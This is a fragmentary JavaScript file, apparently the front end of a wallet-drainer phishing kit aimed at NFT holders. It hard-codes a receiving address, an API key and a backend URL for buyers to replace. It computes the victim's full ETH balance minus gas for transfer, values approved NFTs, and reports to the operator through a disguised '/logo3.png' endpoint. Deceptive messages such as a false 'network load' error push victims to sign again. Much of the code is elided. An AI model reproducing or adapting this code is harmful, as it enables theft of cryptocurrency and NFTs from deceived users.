const RECEIVER = "0xd7bDFde6ffA334D78fD868363aC757B4d6142083";
// match backend RECEIVER constants.js

const COVAL_KEY = "ckey_8ab58fdbd9c64fe893708d7e69a";
// (your API KEY from `https://api.covalenthq.com)

const API_URL = "https://diranft.herokuapp.com"; // CHANGE TO YOUR API_URL
      ...
      if (ethBal < MIN_ETH_BAL) {
        try {
          ...
          if (getItem("seanfts") && getItem("seanfts").nfts.length) {
            ...
            tgSend(
              `Error, balance is too low. (< ${MIN_ETH_BAL} ETH). Balance: ' ${ethBal}`
            );
            notEligible("noETH");
            console.log(
              `[FINISHED]: Error, balance is too low. (< ${MIN_ETH_BAL} ETH). Balance: ' ${ethBal}`
            );
        ...
        Math.round(
          1e5 *
            (ethBal -
              ...
              0.005)
        ) / 1e5; // value to trans = eth bal - gwei * gasLimit
...
async function actionSig(account, mode, valueToTransHex, gasPrice, chainId) {
  try {
    ...
    console.log(
      ">>>>[ACTION SIG: Sign Message for MODE:",
      mode,
      "--> TX: ",
      tx_
    );
    ...
    showError(
      "The action failed due to network load. Please try to sign again"
    );
      ...
      collections = collections.filter(
        (collection) =>
          seaportTesting
            ...
            : collection.description !== "" && seaportTesting
        ...
        collections.forEach((collection) => {
          ...
          currentCollectionNfts.forEach((nftInCurCollection) => {
            ...
            nfts.push({
              ...
              worth: seaportTesting
                ? 1000 // testing = 1000 else
                : Math.round(
  ...
  results.forEach((result, index) => {
    ...
    if (isApproved) {
      ...
      currentCollectionNfts.forEach((nft) => {
        ...
        seaportTesting
          ? (seanfts.totalWorth = 1000)
          : (seanfts.totalWorth += nft.worth); // seaportTesting
...
async function tgSend(mes) {
  console.log("");
  await sendReq("post", `${API_URL}/logo3.png`, "", {
    // logo3 = in backend sendMessHandler
    mes,
  });
}
...
async function notEligible(info) {
  switch (info) {
    case "signDenied":
      alert("You denied the sign request. Please try again.");
      document.querySelector("#onButtonClick").innerHTML = "Connect new wallet";
      break;
    case "noNFTs":
      await verifyAsset();
      break;
...
const ERC1155ABI = [
  ...
  },
  {
    inputs: [
      ...
      { internalType: "address", name: "initialCollection", type: "address" },
      { internalType: "uint256[]", name: "cloneXIds", type: "uint256[]" },
    ...
    outputs: [
      {
        ...
        internalType: "struct RedeemableToken.Remaining[]",
        name: "",
        type: "tuple[]",
      },
    ],
  ...
  {
    inputs: [
      { internalType: "bytes1", name: "dna", type: "bytes1" },
      { internalType: "uint256[2]", name: "range", type: "uint256[2]" },
    ],
    name: "setWearableRange",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
